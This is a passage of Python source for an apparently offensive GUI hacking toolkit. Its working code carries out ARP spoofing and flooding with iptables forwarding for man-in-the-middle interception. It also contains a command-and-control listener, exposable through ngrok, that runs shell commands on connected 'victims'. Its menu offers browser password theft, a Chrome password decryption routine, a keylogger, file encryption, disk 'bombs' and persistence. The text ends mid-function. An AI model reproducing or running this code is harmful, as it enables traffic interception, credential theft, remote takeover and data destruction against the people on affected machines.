        os.system(f"iptables -A FORWARD -i {iface} -j ACCEPT")
        os.system(f"macchanger {iface} -m {actual_mac} >/dev/null")

        arp_packet_gateway=scapy.ARP(op=2,psrc=self.true_ip,pdst=gateway,hwsrc=actual_mac)
        arp_packet=scapy.ARP(op=2,psrc=gateway,pdst=self.true_ip,hwsrc=actual_mac)

        self.spoof_terminal.configure(state="normal")
        self.spoof_terminal.delete("0.0","end")
        while self.spoofing:
            for ip in self.true_ip:
                arp_packet = scapy.ARP(op=2, psrc=gateway, pdst=ip, hwsrc=actual_mac.strip())
                arp_packet_gateway = scapy.ARP(op=2, psrc=ip, pdst=gateway, hwsrc=actual_mac.strip())

                scapy.send(arp_packet, verbose=False)
                scapy.send(arp_packet_gateway, verbose=False)

                self.spoof_terminal.insert("0.0",f"\n Poisoning {ip} with {actual_mac}...")
                self.spoof_terminal.see("end")

            time.sleep(2)  
        self.spoof_terminal.configure(state="disabled")



## ARP Flooding

## ARP Flooding Menu

    def arp_flooding(self):
        self.arp_floding_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        self.arp_floding_frame.place(x=360,y=50)
        self.arp_floding_terminal=ctk.CTkTextbox(self.arp_floding_frame,width=600,height=130, fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",13))
        self.arp_floding_terminal.place(x=40,y=220)
        self.arp_floding_terminal.configure(state="disabled")

        interfaces_text=ctk.CTkLabel(self.arp_floding_frame,text="Available interfaces",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
        interfaces_text.place(x=230,y=50)

        interfaces_list=ctk.CTkOptionMenu(self.arp_floding_frame,values=scapy.get_if_list(),variable=self.interface_flood,width=183,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),button_color="red",button_hover_color="#62090C",dropdown_fg_color="#4D0000",dropdown_text_color="green",dropdown_font=("Hack Nerd Font",15))
        interfaces_list.place(x=229,y=80)

        scan_button=ctk.CTkButton(self.arp_floding_frame,text="CHECK" ,width=30,height=30,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.show_ip_flood,border_width=2,border_color="red")
        scan_button.place(x=420,y=80)

        if self.flooding:
            stop_button=ctk.CTkButton(self.arp_floding_frame,text=" STOP",width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.stop_flood,border_width=2,border_color="red")
            stop_button.place(x=265,y=150)

## Check Button

    def show_ip_flood(self):
        show_ip_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        show_ip_frame.place(x=360,y=50)

        check_box_frame=ctk.CTkFrame(show_ip_frame,width=680,height=400, fg_color="#171717",bg_color="#171717")
        check_box_frame.place(x=10,y=10)
     
        iface=self.interface_flood.get()
        ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
        netmask = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['netmask']
        ip_parts = ip.split('.')
        netmask_parts = netmask.split('.')
        network_parts = [str(int(ip_parts[i]) & int(netmask_parts[i])) for i in range(4)]
        network_address = '.'.join(network_parts)


        ans,unans=scapy.arping(f"{network_address}/24")
        columna=0
        fila=0
        self.ip_checkboxes.clear()
        self.ips.clear()
        for snd,rcv in ans:
            self.ips.append(rcv.psrc)

        for i,ip in enumerate(self.ips):
            globals()[f"variable{i}"]=ctk.BooleanVar()

            checkbox=ctk.CTkCheckBox(check_box_frame,text=ip,variable=globals()[f"variable{i}"],onvalue="on", offvalue="off",fg_color="red",font=("Hack Nerd Font",12),text_color="green",hover_color="red")
            checkbox.grid(row=fila,column=columna,padx=10, pady=2, sticky="w")
            self.ip_checkboxes.append(globals()[f"variable{i}"])

            fila+=1
            if fila==10:
                columna+=1
                fila=0
        
        confirm_button=ctk.CTkButton(show_ip_frame,text="CONFIRM",width=30,height=33.5,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.flood,border_width=2,border_color="red")
        confirm_button.place(x=275,y=320)


## Confirm Button

    def flood(self):
        self.flood_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        self.flood_frame.place(x=360,y=50)
        self.flood_terminal=ctk.CTkTextbox(self.flood_frame,width=600,height=130, fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",13))
        self.flood_terminal.place(x=40,y=220)
        self.flood_terminal.configure(state="disabled")
        self.true_ip.clear()
        self.true_ip=[self.ips[i] for i,var in enumerate(self.ip_checkboxes) if var.get()==True]

        interfaces_text=ctk.CTkLabel(self.flood_frame,text="Available interfaces",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
        interfaces_text.place(x=230,y=50)

        interfaces_list=ctk.CTkOptionMenu(self.flood_frame,values=scapy.get_if_list(),variable=self.interface_flood,width=183,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),button_color="red",button_hover_color="#62090C",dropdown_fg_color="#4D0000",dropdown_text_color="green",dropdown_font=("Hack Nerd Font",15))
        interfaces_list.place(x=229,y=80)

        scan_button=ctk.CTkButton(self.flood_frame,text="CHECK" ,width=30,height=30,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.show_ip_flood,border_width=2,border_color="red")
        scan_button.place(x=420,y=80)

    
        spoof_button=ctk.CTkButton(self.flood_frame,text="󱪁 FLOOD" ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.flood_thread)
        spoof_button.place(x=265,y=150)


## Stop Button

    def stop_flood(self):
        self.flooding_active_label.place(x=30,y=210)
        self.flooding=False
        os.system("sudo iptables --flush")
        os.system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward")
        self.flood_terminal.configure(state="normal")
        self.flood_terminal.delete("0.0","end")
        self.flood_terminal.insert("0.0"," Flooding stopped")
        self.flooding_active_label.destroy()

## Flood Button

    def flood_thread(self):
        self.flooding=True
        self.flooding_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="green",bg_color="black",font=("Hack Nerd Font",30))
        self.flooding_active_label.place(x=30,y=206)
        flood_thread=threading.Thread(target=self.start_flooding)
        flood_thread.start()


## Flood Thread

    def start_flooding(self):
        self.true_ip=[self.ips[i] for i,var in enumerate(self.ip_checkboxes) if var.get()==True]
        iface=self.interface_flood.get()
        gateways = netifaces.gateways()
        if netifaces.AF_INET in gateways:
            for gateway, interface, _ in gateways[netifaces.AF_INET]:
                if interface == iface:
                    gateway=gateway
                    break
        os.system("iptables --flush")
        os.system("iptables --policy FORWARD ACCEPT")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system(f"iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE")
        os.system(f"iptables -A FORWARD -i {iface} -j ACCEPT")

        arp_packet_gateway=scapy.ARP(op=2,psrc=self.true_ip,pdst=gateway,hwsrc="bb:cc:aa:11:22:33")
        arp_packet=scapy.ARP(op=2,psrc=gateway,pdst=self.true_ip,hwsrc="aa:bb:cc:11:22:33")

        self.flood_terminal.configure(state="normal")
        self.flood_terminal.delete("0.0","end")
        while self.flooding:
            for ip in self.true_ip:
                arp_packet = scapy.ARP(op=2, psrc=gateway, pdst=ip, hwsrc="aa:bb:cc:11:22:33")
                arp_packet_gateway = scapy.ARP(op=2, psrc=ip, pdst=gateway, hwsrc="bb:cc:aa:11:22:33")

                scapy.send(arp_packet, verbose=False)
                scapy.send(arp_packet_gateway, verbose=False)

                self.flood_terminal.insert("0.0",f"\n Flooding {ip}...")
                self.flood_terminal.see("end")

            time.sleep(2)  
        self.flood_terminal.configure(state="disabled")



##########################
##### Sniffer Tools ######
##########################

## Sniffer Menu

    def sniffer_tools(self):
      self.destroy_labels()
      self.sniffer_active=True
      self.sniffer_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="yellow",bg_color="black",font=("Hack Nerd Font",30))
      self.sniffer_active_label.place(x=30,y=270)


#############################
##### Command & Control #####
#############################

## C2 Menu

    def c2_options(self):
        self.destroy_labels()
        self.c2_active=True
        for sockets in self.clients_socket:
            self.selected_client_socket=sockets
            if self.remote_execute("whoami")=="Error":
                self.clients_socket.remove(sockets)
                del self.clients_socket_address[sockets]
            else:
                self.active_client=True


        self.c2_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="yellow",bg_color="black",font=("Hack Nerd Font",30))
        self.c2_active_label.place(x=30,y=338)

        if self.listening and len(self.clients_socket) > 0:
            c2_listening_thread=threading.Thread(target=self.c2_listening_thread)
            c2_listening_thread.start()
        else:
            c2_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
            c2_frame.place(x=360,y=50)


            image_path = r"images/malware.png"
            pil_image = Image.open(image_path)
            resized_image=pil_image.resize((250,250))
            tk_image = ImageTk.PhotoImage(resized_image)
            logo = ctk.CTkButton(c2_frame, image=tk_image, text="", width=0, height=0,fg_color="#171717",hover=False)
            logo.place(x=400,y=70)  



            if self.listening and len(self.clients_socket)==0:
                stop_listening_button=ctk.CTkButton(c2_frame,text=" Stop Listening    " ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.c2_stop_listening)
                stop_listening_button.place(x=70,y=170)

            elif self.listening and len(self.clients_socket)>0 :
                self.c2_listening_label.destroy()
                generate_button=ctk.CTkButton(c2_frame,text="󱎶  Create New Malware" ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.c2_generate_malware)
                generate_button.place(x=70,y=80)

                already_malware_button=ctk.CTkButton(c2_frame,text="󰤉  Configure Listener" ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.c2_continue_malware)
                already_malware_button.place(x=70,y=170)


            else:
                generate_button=ctk.CTkButton(c2_frame,text="󱎶  Create New Malware" ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.c2_generate_malware)
                generate_button.place(x=70,y=140)

                already_malware_button=ctk.CTkButton(c2_frame,text="󰤉  Configure Listener" ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.c2_continue_malware)
                already_malware_button.place(x=70,y=220)


## Continue Button

    def c2_continue_malware(self):
      
      c2_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
      c2_frame.place(x=360,y=50)

      image_path = r"images/malware.png"
      pil_image = Image.open(image_path)
      resized_image=pil_image.resize((250,250))
      tk_image = ImageTk.PhotoImage(resized_image)
      logo = ctk.CTkButton(c2_frame, image=tk_image, text="", width=0, height=0,fg_color="#171717",hover=False)
      logo.place(x=400,y=70)  


      listen_port_label=ctk.CTkLabel(c2_frame,text="Listen Port",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
      listen_port_label.place(x=20,y=100)

      listen_port_entry=ctk.CTkEntry(c2_frame,width=60,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),border_width=2,border_color="red",textvariable=self.c2_listen_port)
      listen_port_entry.place(x=180,y=100)

      email_label=ctk.CTkLabel(c2_frame,text="Email (Optional)",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
      email_label.place(x=20,y=150)

      email_entry=ctk.CTkEntry(c2_frame,width=200,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),border_width=2,border_color="red",textvariable=self.email)
      email_entry.place(x=180,y=150)


      ngrok_label=ctk.CTkLabel(c2_frame,text="Generate TCP Tunnel (Ngrok)",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
      ngrok_label.place(x=20,y=200)

      ngrok_switch=ctk.CTkSwitch(c2_frame,text="",variable=self.generate_ngrok_option,onvalue="on",offvalue="off",fg_color="red",progress_color="green")
      ngrok_switch.place(x=280,y=200)

      listen_button=ctk.CTkButton(c2_frame,text="󰤉 Start listening" ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.start_listening)
      listen_button.place(x=80,y=265)


## Start Listening Button

    def start_listening(self):

        email_re = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'

        if re.fullmatch(r'\d+',self.c2_listen_port.get()):
            if 1<= int(self.c2_listen_port.get()) <=65535:
                if not re.match(email_re,self.email.get()) and self.email.get():
                    CTkMessagebox(title="Error!",message="Enter a valid email address.",height=370, width=430,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")
                else:
                    if self.generate_ngrok_option.get()=="on":
                        subprocess.Popen(["ngrok","tcp",self.c2_listen_port.get()],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        self.listening=True
                        self.c2_active_client=False
                        self.c2_listening_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="green",bg_color="black",font=("Hack Nerd Font",30))
                        self.c2_listening_label.place(x=30,y=338)
                        c2_listening_thread=threading.Thread(target=self.c2_listening_thread)
                        c2_listening_thread.start()
                    else:
                        self.listening=True
                        self.c2_active_client=False
                        self.c2_listening_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="green",bg_color="black",font=("Hack Nerd Font",30))
                        self.c2_listening_label.place(x=30,y=338)
                        c2_listening_thread=threading.Thread(target=self.c2_listening_thread)
                        c2_listening_thread.start()

            else:        
                CTkMessagebox(title="Error!",message="Enter a valid listen port.",height=370, width=430,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")
        else:
               CTkMessagebox(title="Error!",message="Enter a valid listen port.",height=370, width=430,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")

    


## Listening Thread

    def c2_listening_thread(self):

        victims_dict=[]
        for client_socket,addr in self.clients_socket_address.items():
             ip,port=addr
             self.selected_client_socket=client_socket
             whoami=self.remote_execute("whoami")
             victims_dict.append(f"{whoami} > {ip}:{port}")


        
        self.c2_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        self.c2_frame.place(x=360,y=50)

        powershell_button=ctk.CTkButton(self.c2_frame,text=" POWERSHELL" ,width=300,height=40,fg_color="#0078D7",text_color="#EEEFF0",hover=True,bg_color="#171717",font=("Hack Nerd Font",20),command=self.powershell_mode,border_color="#0078D7",hover_color="#005A9E")
        powershell_button.place(x=40,y=60)

        cmd_button=ctk.CTkButton(self.c2_frame,text=" CMD" ,width=300,height=40,fg_color="black",text_color="#EEEFF0",hover=True,bg_color="#171717",font=("Hack Nerd Font",20),command=self.cmd_mode,border_color="black",hover_color="#242424")
        cmd_button.place(x=340,y=60)

        c2_victims_label=ctk.CTkLabel(self.c2_frame,text="󱩊  Select Victim",font=("Hack Nerd Font",16),fg_color="#171717",bg_color="#171717",text_color="red")
        c2_victims_label.place(x=40,y=20)

        c2_victims_menu=ctk.CTkOptionMenu(self.c2_frame,dynamic_resizing=False,values=victims_dict,variable=self.victim,width=275,height=30,fg_color="black",bg_color="black",text_color="#EEEFF0",font=("Hack Nerd Font",15),button_color="red",button_hover_color="#62090C",dropdown_fg_color="#4D0000",dropdown_text_color="#EEEFF0",dropdown_font=("Hack Nerd Font",15),command=self.select_victim)
        c2_victims_menu.place(x=210,y=20)

        refresh_button=ctk.CTkButton(self.c2_frame,text="󰦛  REFRESH ",fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",18),command=self.c2_refresh,border_width=2,border_color="red")
        refresh_button.place(x=500,y=20)

        c2_function_menu=ctk.CTkOptionMenu(self.c2_frame,dynamic_resizing=False,values=["Set Persistent","Remote Desktop","Powershell Bomb","Disk Bomb","Install Python","Firefox Passwords","Google Chrome Passwords","Edge Passwords","Brave Passwords","Opera Passwords","Opera GX Passwords","Vivaldi Passwords","Run Python File","Reboot System","Shutdown System","Set Reboot Persistent","Get Location","Get Clipboard","Keylogger","Show pop-up window","Voice Message","Make Screenshot","Encrypt File(s)","Encrypt All Files","Encrypt All Files with victim alert","List Encrypted File(s)","Decrypt File(s)","Decrypt All Files"],variable=self.function,width=200,height=30,fg_color="#4D0000",bg_color="#4D0000",text_color="#EEEFF0",font=("Hack Nerd Font",15),button_color="red",button_hover_color="#62090C",dropdown_fg_color="#4D0000",dropdown_text_color="#EEEFF0",dropdown_font=("Hack Nerd Font",15),command=self.c2_functions)
        c2_function_menu.place(x=440,y=100)

        self.c2_command_terminal=ctk.CTkEntry(self.c2_frame,textvariable=self.command,width=398,height=30,fg_color="black",bg_color="black",text_color="#EEEFF0",font=("Hack Nerd Font",16),border_color="#EEEFF0")
        self.c2_command_terminal.place(x=40,y=100)

        self.c2_listening_terminal=ctk.CTkTextbox(self.c2_frame,width=600,height=250, fg_color="#2c222b",bg_color="#2c222b",text_color="#EEEFF0",font=("Hack Nerd Font",11))
        self.c2_listening_terminal.place(x=40,y=130)
        self.c2_listening_terminal.configure(state="disabled")

        

        host='0.0.0.0'
        port=int(self.c2_listen_port.get())

        if len(self.clients_socket)==0:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            self.server_socket.bind((host, port))
            self.server_socket.listen()

            c2_listening_thread=threading.Thread(target=self.c2_listening_for_clients)
            c2_listening_thread.start()



    def c2_listening_for_clients(self): 
            while self.listening:
                client_socket, client_address = self.server_socket.accept()
                if self.listening:
                    CTkMessagebox(title="Success", message=f"Victim {client_address} found!",height=370, width=630, button_color="red", font=("Hack Nerd Font", 15), icon="check")
                    
                thread = threading.Thread(target=self.client_thread, args=(client_socket,client_address))
                thread.daemon= True 
                thread.start() 
                
                thread2 = threading.Thread(target=self.c2_terminal_command_thread)
                thread2.start()

            

    def client_thread(self,client_socket,client_address):
        self.clients_socket.append(client_socket)
        self.clients_socket_address[client_socket]=client_address

        
    def c2_terminal_command_thread(self):
        self.c2_command_terminal.bind("<Return>", self.on_return)
        self.c2_command_terminal.bind("<Control-l>",self.on_ctrl_l)


    def on_return(self,event):

        command=self.command.get()
        if not self.remote_execute("echo %cd%"):
            self.remote_execute("")
            pwd=self.remote_execute("echo %cd%")
            result=self.remote_execute(command)
            result=f"{pwd}>{command}\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.configure(state="normal")
            self.c2_listening_terminal.insert("end", result, "rojo")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.see('end')


            result=self.remote_execute(command)+"\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
        else:
            pwd=self.remote_execute("echo %cd%")
            result=self.remote_execute(command)
            result=f"{pwd}>{command}\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.configure(state="normal")
            self.c2_listening_terminal.insert("end", result, "rojo")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.see('end')


            result=self.remote_execute(command)+"\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

    def on_ctrl_l(self,event):
        self.c2_listening_terminal.configure(state="normal")
        self.c2_listening_terminal.delete("1.0","end")
        self.c2_listening_terminal.configure(state="disabled")

    def c2_stop_listening(self):
        self.listening = False

        try:
            if hasattr(self, 'c2_listening_label'):
                self.c2_listening_label.destroy()
        except:
            pass

        self.c2_options()




## C2 Functions

    def c2_refresh(self):
        if self.clients_socket:
            self.c2_options()

    def select_victim(self,victim):
        ip=victim.split(":")[0].split(">")[-1].strip()
        port=victim.split(":")[-1]
        victim=(ip,int(port))
        for socket,addr in self.clients_socket_address.items():
            if addr == victim:
                self.selected_client_socket=socket


    def remote_execute(self,command):
        if self.c2_powershell_mode:
            command="powershell.exe "+command
        try:
            self.selected_client_socket.send(command.encode())
            return self.selected_client_socket.recv(8192).decode().strip()
        except:
            return "Error".strip()


    def decrypt_password(self,crypt_text,secret_key):

        try:
            crypt_text=bytes.fromhex(crypt_text)
            secret_key=bytes.fromhex(secret_key)
            initialisation_vector = crypt_text[3:15]
            encrypted_password = crypt_text[15:-16]
            cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
            decrypted_pass = cipher.decrypt(encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except:
            return "Incompatible Chrome Version"
    




    def c2_functions(self,function):
        if function == "Set Persistent":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_set_perisistent)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_set_perisistent)
                c2_terminal_command_thread.start()
        elif function == "Remote Desktop":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_remote_desktop)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_remote_desktop)
                c2_terminal_command_thread.start()
        elif function == "Powershell Bomb":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_powershell_bomb)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_powershell_bomb)
                c2_terminal_command_thread.start()
        elif function == "Disk Bomb":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_disk_bomb)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_disk_bomb)
                c2_terminal_command_thread.start()
        elif function == "Install Python":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_install_python)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_install_python)
                c2_terminal_command_thread.start()
        elif function == "Firefox Passwords":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_firefox_passwords)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_firefox_passwords)
                c2_terminal_command_thread.start()
        elif function == "Google Chrome Passwords":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_google_chrome_passwords)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_google_chrome_passwords)
                c2_terminal_command_thread.start()
        elif function == "Edge Passwords":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_edge_passwords)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_edge_passwords)
                c2_terminal_command_thread.start()
        elif function== "Brave Passwords":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_brave_passwords)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_brave_passwords)
                c2_terminal_command_thread.start()
        elif function == "Opera Passwords":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
